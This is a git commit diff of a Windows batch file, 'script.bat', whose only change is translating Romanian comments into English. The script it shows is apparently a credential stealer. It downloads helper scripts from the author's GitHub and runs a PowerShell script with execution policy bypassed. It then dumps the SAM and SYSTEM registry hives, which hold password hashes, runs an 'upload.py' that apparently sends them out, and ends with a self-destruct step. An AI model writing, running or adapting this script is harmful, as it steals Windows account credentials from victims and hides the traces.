e3793d13807e541c2498c31ecdce448d79890eb3
Voltex-XD <96913694+Voltex-XD@users.noreply.github.com>
2025-04-13 18:31:34 +0300

    Update script.bat

--- script1/script.bat
+++ script1/script.bat
@@ -1,20 +1,20 @@
 @echo off
 setlocal ENABLEDELAYEDEXPANSION
 
-REM Obține locația scriptului curent
+REM Get current location
 set SCRIPT_DIR=%~dp0
 
-REM Mergi la directorul scriptului
+REM Go to file location
 cd /d "%SCRIPT_DIR%"
 
-REM Descarcă fișierele necesare
+REM Download necesary files
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/.env > ".env"
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/install.bat > "install.bat"
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/intialize.ps1 > "initialize.ps1"
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/upload.py > "upload.py"
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/erase.bat > "erase.bat"
 
-REM Verifică dacă initialize.ps1 a fost descărcat corect
+REM Verify if initialize.ps1 is installed correctly
 findstr /i "404" initialize.ps1 >nul
 if %errorlevel%==0 (
     echo [!] Eroare: initialize.ps1 nu a fost găsit sau GitHub a returnat 404.
@@ -22,17 +22,17 @@ if %errorlevel%==0 (
     exit /b
 )
 
-REM Rulează scriptul PowerShell
+REM Run powershell script
 powershell -ExecutionPolicy Bypass -File initialize.ps1
 
-REM Instalează dependențele
+REM Install dependencies
 call install.bat
 
-REM Salvează registry (necesită privilegii de admin)
+REM Save registry (necesită privilegii de admin)
 powershell -Command "reg save HKLM\sam .\sam.save"
 powershell -Command "reg save HKLM\system .\system.save"
 
-REM Rulează scriptul Python
+REM Run python script
 py upload.py
 
 REM Self-destruct operation
